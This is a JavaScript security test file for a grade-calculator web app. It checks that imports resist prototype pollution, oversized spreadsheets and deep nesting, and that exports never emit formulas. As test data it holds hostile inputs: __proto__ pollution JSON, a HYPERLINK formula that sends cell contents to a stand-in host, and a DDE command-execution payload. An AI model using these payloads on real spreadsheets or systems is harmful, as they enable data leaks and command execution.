// Round 4 AuthGuard review: hostile files (site/js/files.js). Anyone can hand a student a "backup", template or
// spreadsheet, so every import must be safe to open: no prototype pollution, no tab freeze, nothing that breaks the
// page once saved, no formulas in exports, and templates never carry marks. Made-up data only.
import { readFileSync } from 'node:fs';
import { assert } from './helpers.js';
import { build } from '../scripts/build.mjs';
import { computeAll } from '../shared/calc.js';

build();
globalThis.document ??= { getElementById: () => null };
const F = await import('../site/js/files.js');
const { normalize } = await import('../site/js/store.js');
const { demoDoc } = await import('../site/js/demo.js');
const XLSX = {};
new Function('exports', readFileSync(new URL('../site/vendor/sheetjs-0.20.3/xlsx.mini.min.js', import.meta.url), 'utf8'))(XLSX);

const throwsLike = (fn, re, msg) => {
  try { fn(); } catch (e) { assert(re.test(e.message), `${msg}: wrong error "${e.message}"`); return; }
  throw new Error(`${msg}: did not throw`);
};
const xlsxBytes = (sheets) => {
  const wb = XLSX.utils.book_new();
  for (const [n, ws] of Object.entries(sheets)) XLSX.utils.book_append_sheet(wb, Array.isArray(ws) ? XLSX.utils.aoa_to_sheet(ws) : ws, n);
  return XLSX.write(wb, { type: 'array', bookType: 'xlsx' });
};
/** What the page does with a chosen spreadsheet (app.js readImport). */
const readXlsx = (bytes) => F.fromSheets(F.sheetsFromWorkbook(XLSX, XLSX.read(bytes, F.XLSX_READ_OPTS)));
const timed = (fn) => { const t = Date.now(); const r = fn(); return [r, Date.now() - t]; };
const backup = (gradebook) => ({ app: 'GradeCalc', kind: 'backup', format: 1, gradebook });
const chain = (n) => {
  const d = { terms: [{ id: 1, name: 'T' }], courses: [{ id: 2, term_id: 1, title: 'DEMO-1010' }], components: [], assessments: [] };
  for (let i = 0; i < n; i++) d.components.push({ id: 10 + i, course_id: 2, parent_id: i ? 9 + i : null, name: `K${i}`, weight: 1 });
  return d;
};

test('xlsx: a tiny file declaring a huge range is clamped (no billion-cell freeze)', () => {
  const ws = { '!ref': 'A1:XFD20000', A1: { t: 's', v: 'Course' }, B1: { t: 's', v: 'Component' }, XFD20000: { t: 'n', v: 1 } };
  const bytes = xlsxBytes({ S: ws });
  assert(bytes.byteLength < 50000, 'the hostile file is small');
  const [sheets, ms] = timed(() => F.sheetsFromWorkbook(XLSX, XLSX.read(bytes, F.XLSX_READ_OPTS)));
  assert(ms < 3000, `clamped read took ${ms} ms`);
  assert(sheets.S.length <= F.MAX_ROWS + 2 && sheets.S.every((r) => r.length <= F.MAX_COLS), 'rows and columns clamped');
});

test('xlsx: rows past the cap are not parsed and the import is refused', () => {
  const rows = [['Course', 'Component', 'Item', 'Mark']];
  for (let i = 0; i < F.MAX_ROWS + 50; i++) rows.push(['DEMO-1010', 'Quizzes', `Q${i}`, 50]);
  const wb = XLSX.read(xlsxBytes({ Marks: rows }), F.XLSX_READ_OPTS);
  assert(XLSX.utils.decode_range(wb.Sheets.Marks['!ref']).e.r <= F.MAX_ROWS + 1, 'sheetRows stops the parser');
  throwsLike(() => F.fromSheets(F.sheetsFromWorkbook(XLSX, wb)), /too many rows/, 'over the row cap');
  assert(F.sheetsFromWorkbook(XLSX, { SheetNames: Array.from({ length: 40 }, (_, i) => `S${i}`), Sheets: {} }) && true, 'missing sheets are empty');
  assert(Object.keys(F.sheetsFromWorkbook(XLSX, { SheetNames: Array.from({ length: 40 }, (_, i) => `S${i}`), Sheets: {} })).length === F.MAX_SHEETS, 'sheet cap');
});

test('20,000-row imports stay linear (worst cases for name lookups)', () => {
  const N = F.MAX_ROWS;
  const sh = { Terms: [['Id', 'Name'], [1, 'T']], Courses: [['Id', 'Term id', 'Title'], [2, 1, 'DEMO-1010']],
    Components: [['Id', 'Course', 'Name']], Items: [['Course', 'Component', 'Name', 'Mark']] };
  for (let i = 0; i < N; i++) sh.Components.push([10 + i, 'DEMO-1010', `K${i}`]);
  for (let i = 0; i < N; i++) sh.Items.push(['DEMO-1010', `K${N - 1 - i}`, 'I', 50]);
  const [d, ms] = timed(() => F.fromSheets(sh));
  assert(d.assessments.length === N && ms < 6000, `sheets import took ${ms} ms`);
  const rows = [F.MARKS_COLS];
  for (let i = 0; i < N; i++) rows.push(['T', 1, `DEMO-${i}`, `Course ${i}`, 3, `K${i}`, 10, 'I', 50, '%', '', '', '']);
  const [d2, ms2] = timed(() => F.fromMarksTable(rows));
  assert(d2.courses.length === N && ms2 < 6000, `marks table import took ${ms2} ms`);
});

test('nesting deeper than MAX_DEPTH is refused in backups, workbooks and templates (would break the page once saved)', () => {
  assert(F.readJson(backup(chain(F.MAX_DEPTH + 1))).doc.components.length === F.MAX_DEPTH + 1, 'MAX_DEPTH levels are fine');
  throwsLike(() => F.readJson(backup(chain(F.MAX_DEPTH + 2))), /nested too deep/, 'backup one level too deep');
  const [, ms] = timed(() => throwsLike(() => F.readJson(backup(chain(20000))), /nested too deep/, '20,000-deep backup'));
  assert(ms < 2000, `deep backup refused in ${ms} ms`);
  // A long loop is refused too (calc.js would walk it once per component).
  const loop = chain(50); loop.components[0].parent_id = 59;
  throwsLike(() => F.readJson(backup(loop)), /nested too deep/, 'long loop');
  // Deleted rows count (they can be restored).
  const del = chain(F.MAX_DEPTH + 2); del.components.at(-1).deleted_at = '2026-11-01T00:00:00Z';
  throwsLike(() => F.readJson(backup(del)), /nested too deep/, 'deleted deep row');
  // Workbook Parent id column.
  const sh = { Terms: [['Id', 'Name'], [1, 'T']], Courses: [['Id', 'Term id', 'Title'], [2, 1, 'DEMO-1010']], Components: [['Id', 'Course id', 'Parent id', 'Name']] };
  for (let i = 0; i < 30; i++) sh.Components.push([10 + i, 2, i ? 9 + i : '', `K${i}`]);
  throwsLike(() => F.fromSheets(sh), /nested too deep/, 'workbook chain');
  // Template: parts must follow their group, and stay within MAX_DEPTH.
  const tpl = { app: 'GradeCalc', kind: 'course-template', format: 1, course: { title: 'DEMO-2020' },
    components: Array.from({ length: F.MAX_DEPTH + 2 }, (_, i) => ({ ref: i + 1, parent_ref: i ? i : null, name: `K${i}`, items: [] })) };
  throwsLike(() => F.readJson(tpl), /nested too deep/, 'template chain');
  tpl.components.length = 2;
  assert(F.readJson(tpl).template.plan.length === 2, 'one level of parts is fine');
});

test('hostile keys never reach a prototype (sheet headers, settings, JSON rows and rule objects)', () => {
  const d = F.fromSheets({ Terms: [['Id', 'Name', '__proto__', 'constructor', 'hasOwnProperty'], [1, 'T', new Date(0), 'x', 'y']],
    Courses: [['Id', 'Term id', 'Title', '__proto__'], [2, 1, 'DEMO-1010', new Date(0)]],
    Settings: [['Setting', 'Value'], ['__proto__', 'x'], ['constructor', 'y'], ['gpa_scale', 'percent']] });
  assert(d.terms.length === 1 && d.courses.length === 1 && Object.getPrototypeOf(d.terms[0]) === Object.prototype, 'rows are plain');
  assert(Object.keys(d.settings).sort().join() === 'custom_scale,default_credits,gpa_scale,repeat_policy_default', 'only known settings');
  const csv = F.fromMarksTable(F.parseCsv('Course,Component,__proto__,constructor\r\nDEMO-1010,Quizzes,x,y\r\n'));
  assert(csv.components.length === 1, 'CSV with hostile headers still imports');
  const raw = JSON.parse(`{"app":"GradeCalc","kind":"backup","format":1,"gradebook":{"__proto__":{"polluted":1},
    "settings":{"__proto__":{"polluted":1},"gpa_scale":"percent"},
    "terms":[{"id":1,"name":"T","__proto__":{"polluted":1},"constructor":{"prototype":{"polluted":1}}}],
    "courses":[{"id":2,"term_id":1,"title":"DEMO-1010","curve":{"__proto__":{"polluted":1}}}],
    "components":[{"id":3,"course_id":2,"name":"Labs","weight":100,"rule":{"__proto__":{"type":"best_of"},"constructor":1}}],
    "assessments":[],"audit":[{"entity":"__proto__","before":{"__proto__":{"polluted":1}}}]}}`);
  const got = F.readJson(raw).doc;
  computeAll(got); F.toSheets(got); F.appendDoc(normalize(demoDoc()), got);
  assert(({}).polluted === undefined && Object.prototype.polluted === undefined, 'Object.prototype untouched');
  assert(!Object.prototype.hasOwnProperty.call(got.terms[0], 'constructor') && got.settings.gpa_scale === 'percent', 'unknown fields dropped');
});

test('hostile rule / curve / scale values never make the math or the export throw', () => {
  const junk = [1, 'x', '{', [], {}, { type: 'absorb_if_higher', from: 'abc' }, { type: 'absorb_if_higher', from: [null, {}, 'a'] },
    { type: 'best_of', n: -5 }, { type: 'best_of', n: 1e9 }, { to: {} }, { by_date: 'x' }, { by_date: { pivot: {}, date: 5 } },
    { type: 'add', value: 'x' }, { type: 'mul', value: 1e308 }, { bands: [{ min: 'x', letter: {}, points: 'y' }] }];
  const base = normalize(demoDoc());
  for (const j of junk) {
    const d = JSON.parse(JSON.stringify(base));
    for (const k of d.components) { k.rule = j; k.excused_to = j; }
    for (const c of d.courses) c.curve = j;
    for (const a of d.assessments) a.curve = j;
    d.settings = { gpa_scale: 'custom', custom_scale: j };
    const got = F.readJson(backup(d)).doc;
    computeAll({ ...got, terms: got.terms.filter((t) => !t.deleted_at) });
    F.toCsv(F.marksTable(got));
    F.appendDoc(base, got);
  }
});

test('CSV export: user text never starts a formula; the guard round-trips exactly', () => {
  const evil = ['=HYPERLINK("http://example.invalid/?x="&A1,"click")', '+1+1', '-2+3', '@SUM(A1)', '\t=1', '\r=1', "'=already", "''=two", "'plain", 'ok'];
  const csv = F.toCsv([evil, [-5, 0, 85.5]]);
  const cells = F.parseCsv(csv);
  assert(JSON.stringify(cells[0]) === JSON.stringify(evil), `round trip: ${JSON.stringify(cells[0])}`);
  assert(JSON.stringify(cells[1]) === '["-5","0","85.5"]', 'numbers stay numbers');
  // Every raw cell as a spreadsheet would see it (quotes removed): none starts with = + - @ tab CR unless it's a number.
  const raw = csv.replace(/^﻿/, '').split('\r\n')[0];
  for (const c of raw.match(/("([^"]|"")*"|[^,]*)/g).filter((x) => x !== '')) {
    const v = c.startsWith('"') ? c.slice(1, -1).replace(/""/g, '"') : c;
    assert(!/^[=+\-@\t\r]/.test(v), `unguarded cell ${JSON.stringify(v)}`);
  }
  // Through the real export: hostile names in a gradebook.
  const d = normalize(demoDoc());
  d.courses[0].title = '=cmd|"/c calc"!A0'; d.components[0].name = '@SUM(1+1)'; d.assessments[0].name = '+HYPERLINK("x")';
  for (const line of F.toCsv(F.marksTable(d)).split('\r\n')) assert(!/(^|,)"?[=+@]/.test(line), `unguarded export line: ${line.slice(0, 80)}`);
});

test('Excel export: hostile text is written as text cells, never formulas', () => {
  const d = normalize(demoDoc());
  d.courses[0].title = '=HYPERLINK("http://example.invalid","x")'; d.components[0].name = '=1+1'; d.assessments[0].name = '@SUM(1)';
  const wb = XLSX.utils.book_new();
  for (const [n, rows] of Object.entries(F.toSheets(d))) XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(rows), n);
  const back = XLSX.read(XLSX.write(wb, { type: 'array', bookType: 'xlsx' }), { type: 'array', cellFormula: true });
  let found = 0;
  for (const n of back.SheetNames) {
    for (const [addr, cell] of Object.entries(back.Sheets[n])) {
      if (addr.startsWith('!')) continue;
      assert(!cell.f, `${n}!${addr} became a formula`);
      if (typeof cell.v === 'string' && /^[=@]/.test(cell.v)) { found++; assert(cell.t === 's', `${n}!${addr} is text`); }
    }
  }
  assert(found >= 3, 'the hostile strings are there, as text');
});

test('templates never carry marks, notes, results or dates (export and a crafted import)', () => {
  const d = normalize(demoDoc());
  const c = d.courses.find((x) => !x.deleted_at);
  c.notes = 'private note'; c.final_override = 0.9; c.final_letter = 'A'; c.curve = { type: 'add', value: 1 }; c.pass_result = 'pass';
  const comps = d.components.filter((k) => k.course_id === c.id);
  for (const k of comps) k.projected = 0.8;
  const items = d.assessments.filter((a) => comps.some((k) => k.id === a.component_id));
  for (const a of items) { a.mark = 0.77; a.letter = 'B'; a.date = '2026-10-01'; a.curve = { type: 'add', value: 1 }; a.excused = 1; a.projected = 0.5; }
  const text = JSON.stringify(F.courseTemplate(c, comps, items));
  for (const k of ['"mark"', '"letter"', '"date"', '"notes"', 'private note', '"final_override"', '"final_letter"', '"curve"', '"pass_result"', '"projected"', '"excused"', '"status"']) {
    assert(!text.includes(k), `template export carries ${k}`);
  }
  const crafted = { app: 'GradeCalc', kind: 'course-template', format: 1,
    course: { title: 'DEMO-3030', notes: 'x', final_override: 1, final_letter: 'A+', curve: { type: 'set', value: 1 }, status: 'complete', term_id: 99, id: 5 },
    components: [{ ref: 1, name: 'Exam', weight: 100, projected: 1, course_id: 99, id: 7,
      items: [{ name: 'Final', mark: 1, letter: 'A+', date: '2026-01-01', excused: 1, curve: { type: 'set', value: 1 }, projected: 1, component_id: 99 }] }] };
  const t = F.readJson(crafted).template;
  assert(Object.keys(t.course).sort().join() === 'cap_100,code,credits,short_name,title,type', `course keys ${Object.keys(t.course)}`);
  assert(!('projected' in t.plan[0].body) && !('course_id' in t.plan[0].body), 'component keys');
  assert(Object.keys(t.plan[0].items[0]).sort().join() === 'counts_in,item_weight,name,out_of,sort_order', `item keys ${Object.keys(t.plan[0].items[0])}`);
});
